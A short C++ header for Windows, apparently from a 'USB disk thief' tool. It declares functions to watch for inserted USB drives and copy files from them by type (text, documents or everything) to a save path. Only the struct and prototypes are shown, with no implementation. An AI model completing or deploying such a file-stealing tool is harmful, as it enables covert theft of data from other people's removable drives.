#pragma once

#include <iostream>
#include <Windows.h>
#include <dbt.h>

#ifndef USB_DISK_THIEF

struct UThief
{
	TCHAR savePath[MAX_PATH];
	DWORD fileSize;
	DWORD fileType;
	TCHAR theftPath[MAX_PATH];
};


#define ALL_TYPE 0x4	//大于4所有都拷贝
#define TXT_TYPE 0x2
#define DOC_TYPE 0x1



#endif
BOOL StartWatch(HANDLE hRecipient);
BOOL EndWatch();
BOOL RunThief(TCHAR* SavePath, DWORD FileSize, DWORD FileType, TCHAR* TheftPath);

